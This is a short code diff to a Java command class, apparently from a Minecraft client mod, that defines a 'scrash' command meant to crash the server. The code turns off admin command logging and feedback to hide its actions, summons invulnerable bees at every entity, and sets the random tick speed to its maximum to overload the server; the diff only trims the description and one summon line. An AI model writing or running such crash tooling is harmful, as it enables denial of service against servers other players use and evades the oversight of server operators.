@@ -11,7 +11,7 @@ import static spigey.asteroide.util.perm;
 
 public class ServerCrash extends Command {
     public ServerCrash() {
-        super("scrash", "Crashes the server ENABLE BEE NORENDER");
+        super("scrash", "Crashes the server");
     }
 
     @Override
@@ -27,7 +27,7 @@ public class ServerCrash extends Command {
                 msg("/gamerule logAdminCommands false");
                 msg("/gamerule sendCommandFeedback false");
             }
-            msg("/execute as @e as @e run summon bee ~ ~-10 ~ {Invulnerable:1}");
+            msg("/execute as @e run summon bee ~ ~-10 ~ {Invulnerable:1}");
             msg("/gamerule randomTickSpeed 2147483647");
             if(mc.player.hasPermissionLevel(2)){
                 msg("/save-all");
